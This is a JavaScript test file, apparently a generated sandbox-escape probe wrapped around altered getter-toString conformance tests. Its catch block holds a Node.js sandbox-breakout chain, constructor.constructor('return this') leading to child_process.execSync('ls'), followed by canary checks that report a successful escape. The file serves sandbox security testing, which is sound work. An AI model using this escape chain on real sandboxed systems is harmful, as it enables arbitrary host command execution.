try {
    let x = 'h';
    class F {
        get f() {
            let REPLACER = 23;
        }
    }
    class G {
        get ['g']() {
            throw () => {
                return () => {
                };
            };
        }
    }
    class H {
        get [x]() {
        }
    }
    let f = Object.getOwnPropertyDescriptor(F.prototype, 'f').get;
    let g = Object.getOwnPropertyDescriptor(G.prototype, 'g').get;
    let h = Object.getOwnPropertyDescriptor(H.prototype, 'h').get;
    assertToStringOrNativeFunction(f, 'get /* a */ f /* b */ ( /* c */ ) /* d */ { /* e */ }');
    assertToStringOrNativeFunction(g, 'get /* a */ [ /* b */ "g" /* c */ ] /* d */ ( /* e */ ) /* f */ { /* g */ }');
    assertToStringOrNativeFunction(h, 'get /* a */ [ /* b */ x /* c */ ] /* d */ ( /* e */ ) /* f */ { /* g */ }');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}